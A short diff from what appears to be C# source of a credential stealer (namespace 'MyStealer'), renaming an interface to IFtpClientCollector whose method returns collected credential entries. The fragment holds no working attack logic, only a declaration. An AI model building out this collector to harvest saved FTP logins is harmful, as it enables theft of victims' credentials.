@@ -2,7 +2,7 @@
 
 namespace MyStealer.Collectors.FtpClient
 {
-    internal interface IMessengerCollector
+    internal interface IFtpClientCollector
     {
         IImmutableSet<CredentialEntry> GetCredentials();
     }
